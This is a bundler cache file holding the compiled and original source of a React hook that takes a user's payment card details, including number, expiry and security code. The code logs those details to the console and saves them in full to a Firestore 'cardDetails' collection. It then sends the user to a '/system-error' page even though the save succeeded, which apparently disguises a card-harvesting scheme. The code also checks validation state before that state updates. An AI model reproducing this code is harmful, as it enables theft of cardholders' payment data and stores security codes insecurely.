{"ast":null,"code":"var _s = $RefreshSig$();\n\nimport { useState } from 'react';\nimport validateInfo from './validateInfo';\nimport { useAuth } from '../src/context/AuthContext';\nimport { setDoc, doc } from 'firebase/firestore';\nimport { db } from \"./firebase\";\nimport { useNavigate } from \"react-router-dom\";\n\nconst useForm = () => {\n  _s();\n\n  const {\n    user\n  } = useAuth();\n  const navigate = useNavigate();\n  const [values, setValues] = useState({\n    cardName: '',\n    cardNumber: '',\n    cardType: '',\n    cardExpiration: '',\n    cardSecurityCode: '',\n    cardPostalCode: '',\n    focus: ''\n  });\n  const [errors, setErrors] = useState({});\n\n  const handleFocus = e => {\n    setValues({ ...values,\n      focus: e.target.name === 'cardSecurityCode' ? 'cvc' : e.target.name\n    });\n  };\n\n  const handleChange = e => {\n    const {\n      name,\n      value\n    } = e.target;\n    setValues({ ...values,\n      [name]: value\n    });\n  };\n\n  const handleSubmit = e => {\n    e.preventDefault();\n    setErrors(validateInfo(values));\n    console.log(values);\n\n    if (errors.message === \"Credit Card is valid\" || errors.variant === \"success\") {\n      console.log('successful');\n      setDoc(doc(db, 'cardDetails', user.uid), {\n        cname: values.cardName,\n        cnumber: values.cardNumber,\n        cExpiration: values.cardExpiration,\n        cSecurityCode: values.cardSecurityCode,\n        cType: values.cardType,\n        cPostalCode: values.cardPostalCode\n      });\n      navigate('/system-error');\n    } else {\n      console.log('false');\n    }\n  };\n\n  return {\n    handleChange,\n    handleFocus,\n    handleSubmit,\n    values,\n    errors\n  };\n};\n\n_s(useForm, \"kPXJ1mAhk8EarJsykenaI5ghT7Q=\", false, function () {\n  return [useAuth, useNavigate];\n});\n\nexport default useForm;","map":{"version":3,"sources":["C:/Users/Chinenye/Desktop/DELIGHT/MOVIES/carnival/src/useForm.js"],"names":["useState","validateInfo","useAuth","setDoc","doc","db","useNavigate","useForm","user","navigate","values","setValues","cardName","cardNumber","cardType","cardExpiration","cardSecurityCode","cardPostalCode","focus","errors","setErrors","handleFocus","e","target","name","handleChange","value","handleSubmit","preventDefault","console","log","message","variant","uid","cname","cnumber","cExpiration","cSecurityCode","cType","cPostalCode"],"mappings":";;AAAA,SAASA,QAAT,QAAyB,OAAzB;AACA,OAAOC,YAAP,MAAyB,gBAAzB;AACA,SAASC,OAAT,QAAwB,4BAAxB;AACA,SACIC,MADJ,EAEIC,GAFJ,QAGS,oBAHT;AAIE,SAAUC,EAAV,QAAoB,YAApB;AACA,SAASC,WAAT,QAA4B,kBAA5B;;AACF,MAAMC,OAAO,GAAG,MAAM;AAAA;;AAClB,QAAM;AAAEC,IAAAA;AAAF,MAAWN,OAAO,EAAxB;AACA,QAAMO,QAAQ,GAAGH,WAAW,EAA5B;AACA,QAAM,CAACI,MAAD,EAASC,SAAT,IAAsBX,QAAQ,CAAC;AACjCY,IAAAA,QAAQ,EAAE,EADuB;AAEjCC,IAAAA,UAAU,EAAE,EAFqB;AAGjCC,IAAAA,QAAQ,EAAE,EAHuB;AAIjCC,IAAAA,cAAc,EAAE,EAJiB;AAKjCC,IAAAA,gBAAgB,EAAE,EALe;AAMjCC,IAAAA,cAAc,EAAE,EANiB;AAOjCC,IAAAA,KAAK,EAAE;AAP0B,GAAD,CAApC;AAUA,QAAM,CAACC,MAAD,EAASC,SAAT,IAAsBpB,QAAQ,CAAC,EAAD,CAApC;;AAEA,QAAMqB,WAAW,GAAIC,CAAD,IAAO;AACvBX,IAAAA,SAAS,CAAC,EACN,GAAGD,MADG;AAENQ,MAAAA,KAAK,EAAGI,CAAC,CAACC,MAAF,CAASC,IAAT,KAAkB,kBAAnB,GAAyC,KAAzC,GAAiDF,CAAC,CAACC,MAAF,CAASC;AAF3D,KAAD,CAAT;AAIH,GALD;;AAOA,QAAMC,YAAY,GAAGH,CAAC,IAAI;AACtB,UAAM;AAAEE,MAAAA,IAAF;AAAQE,MAAAA;AAAR,QAAkBJ,CAAC,CAACC,MAA1B;AACAZ,IAAAA,SAAS,CAAC,EACN,GAAGD,MADG;AAEN,OAACc,IAAD,GAAQE;AAFF,KAAD,CAAT;AAIH,GAND;;AAQA,QAAMC,YAAY,GAAGL,CAAC,IAAI;AACtBA,IAAAA,CAAC,CAACM,cAAF;AACAR,IAAAA,SAAS,CAACnB,YAAY,CAACS,MAAD,CAAb,CAAT;AACAmB,IAAAA,OAAO,CAACC,GAAR,CAAYpB,MAAZ;;AACA,QAAGS,MAAM,CAACY,OAAP,KAAmB,sBAAnB,IAA6CZ,MAAM,CAACa,OAAP,KAAmB,SAAnE,EAA8E;AAC1EH,MAAAA,OAAO,CAACC,GAAR,CAAY,YAAZ;AACA3B,MAAAA,MAAM,CAACC,GAAG,CAACC,EAAD,EAAK,aAAL,EAAoBG,IAAI,CAACyB,GAAzB,CAAJ,EAAmC;AACrCC,QAAAA,KAAK,EAAExB,MAAM,CAACE,QADuB;AAErCuB,QAAAA,OAAO,EAAEzB,MAAM,CAACG,UAFqB;AAGrCuB,QAAAA,WAAW,EAAE1B,MAAM,CAACK,cAHiB;AAIrCsB,QAAAA,aAAa,EAAE3B,MAAM,CAACM,gBAJe;AAKrCsB,QAAAA,KAAK,EAAE5B,MAAM,CAACI,QALuB;AAMrCyB,QAAAA,WAAW,EAAE7B,MAAM,CAACO;AANiB,OAAnC,CAAN;AAWCR,MAAAA,QAAQ,CAAC,eAAD,CAAR;AACJ,KAdD,MAcK;AACDoB,MAAAA,OAAO,CAACC,GAAR,CAAY,OAAZ;AACH;AACJ,GArBD;;AAuBA,SAAO;AAAEL,IAAAA,YAAF;AAAgBJ,IAAAA,WAAhB;AAA6BM,IAAAA,YAA7B;AAA2CjB,IAAAA,MAA3C;AAAmDS,IAAAA;AAAnD,GAAP;AACH,CAtDD;;GAAMZ,O;UACeL,O,EACAI,W;;;AAsDrB,eAAeC,OAAf","sourcesContent":["import { useState } from 'react'\r\nimport validateInfo from './validateInfo';\r\nimport { useAuth } from '../src/context/AuthContext'\r\nimport {\r\n    setDoc,\r\n    doc\r\n  } from 'firebase/firestore'\r\n  import {  db } from \"./firebase\"\r\n  import { useNavigate } from \"react-router-dom\"\r\nconst useForm = () => {\r\n    const { user } = useAuth()\r\n    const navigate = useNavigate();\r\n    const [values, setValues] = useState({\r\n        cardName: '',\r\n        cardNumber: '',\r\n        cardType: '',\r\n        cardExpiration: '',\r\n        cardSecurityCode: '',\r\n        cardPostalCode: '',\r\n        focus: ''\r\n    })\r\n\r\n    const [errors, setErrors] = useState({})\r\n\r\n    const handleFocus = (e) => {\r\n        setValues({ \r\n            ...values,\r\n            focus: (e.target.name === 'cardSecurityCode') ? 'cvc' : e.target.name\r\n        });\r\n    }\r\n\r\n    const handleChange = e => {\r\n        const { name, value } = e.target\r\n        setValues({\r\n            ...values,\r\n            [name]: value\r\n        })\r\n    }\r\n\r\n    const handleSubmit = e => {\r\n        e.preventDefault()\r\n        setErrors(validateInfo(values))\r\n        console.log(values);\r\n        if(errors.message === \"Credit Card is valid\" || errors.variant === \"success\" ){\r\n            console.log('successful');\r\n            setDoc(doc(db, 'cardDetails', user.uid), {\r\n                cname: values.cardName,\r\n                cnumber: values.cardNumber,\r\n                cExpiration: values.cardExpiration,\r\n                cSecurityCode: values.cardSecurityCode,\r\n                cType: values.cardType,\r\n                cPostalCode: values.cardPostalCode,\r\n              });\r\n\r\n\r\n              \r\n             navigate('/system-error');\r\n        }else{\r\n            console.log('false');\r\n        }\r\n    };\r\n    \r\n    return { handleChange, handleFocus, handleSubmit, values, errors };\r\n};\r\n\r\nexport default useForm; "]},"metadata":{},"sourceType":"module"}